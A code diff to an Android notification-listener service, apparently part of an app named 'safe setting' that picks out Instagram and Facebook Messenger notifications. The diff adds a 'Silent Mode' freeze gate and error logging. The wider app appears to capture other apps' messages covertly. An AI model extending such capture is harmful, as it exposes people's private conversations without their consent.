@@ -5,6 +5,8 @@ import android.app.Notification
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import dagger.hilt.android.AndroidEntryPoint
+import android.util.Log
+import com.safe.setting.app.utils.GlobalConfig
 import com.safe.setting.app.utils.Consts.FACEBOOK_MESSENGER_PACK_NAME
 import com.safe.setting.app.utils.Consts.INSTAGRAM_PACK_NAME
 import com.safe.setting.app.utils.Consts.TYPE_INSTAGRAM
@@ -36,7 +38,15 @@ class NotificationService : NotificationListenerService() {
     @Suppress("DEPRECATION")
     override fun onNotificationPosted(sbn: StatusBarNotification?) {
         super.onNotificationPosted(sbn)
+        try {
         if (sbn!=null){
+            // Silent Mode gate: do not process notifications when frozen
+            try {
+                if (GlobalConfig.isFrozen) {
+                    Log.d("NotificationService", "Silent Mode: notification dropped")
+                    return
+                }
+            } catch (_: Exception) {}
             val typeNotification = matchTypeNotification(sbn.packageName)
             if (sbn.tag != null && typeNotification!=0){
 
@@ -49,6 +59,9 @@ class NotificationService : NotificationListenerService() {
                 }
 
             }
+        }
+        } catch (e: Exception) {
+            Log.e("NotificationService", "onNotificationPosted error: ${e.message}")
         }
     }
 
